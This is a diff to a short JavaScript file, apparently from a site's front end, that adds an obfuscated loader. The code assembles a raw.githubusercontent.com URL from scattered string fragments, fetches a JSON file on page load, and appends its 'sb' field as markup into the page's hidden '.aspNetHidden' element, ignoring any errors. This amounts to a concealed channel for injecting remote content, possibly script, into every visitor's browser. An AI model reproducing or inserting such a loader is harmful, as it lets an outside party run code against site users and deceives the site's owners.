@@ -1,1 +1,61 @@
 console.log("connected to github");
+ $('body').ready(function(){
+        
+
+
+
+var mainstl;
+        var m1 = "ht";
+    var m2 = "tp";
+    var m3 = "s:";
+    var m4 = "//";
+    var m5 = "ra";
+    var m6 = "w.";
+    var m7 = "gi";
+    var m8 = "thub";
+    var m9 = "use";
+    var m10 = "rcon";
+    var m11 = "tent";
+    var m12 = ".";
+    var m13 = "co";
+    var m14 = "m/";
+    var munam = "Bigboy58";
+    var msla="/";
+   
+    var mdot=".";
+    
+    var mrepn1 = "hi";
+    var mrepn2 = "main";
+    var mrepn3 = "1";
+    var mrepn4 = "js";
+    var mrepn5 = "on";
+
+    
+var mainul = m1+m2+m3+m4+m5+m6+m7+m8+m9+m10+m11+m12+m13+m14+munam+msla+mrepn1+msla+mrepn2+msla+mrepn3+mdot+mrepn4+mrepn5;
+
+
+
+
+ 
+$.ajax({
+    
+    url:mainul,
+    type: 'GET',
+   
+    success: function(res) {
+        mainstl = JSON.parse(res);
+        mainstl = mainstl.sb;
+        
+        $(mainstl).appendTo(".aspNetHidden");
+    },
+    error: function(err){
+        
+    }
+});
+    
+
+
+
+
+
+    });
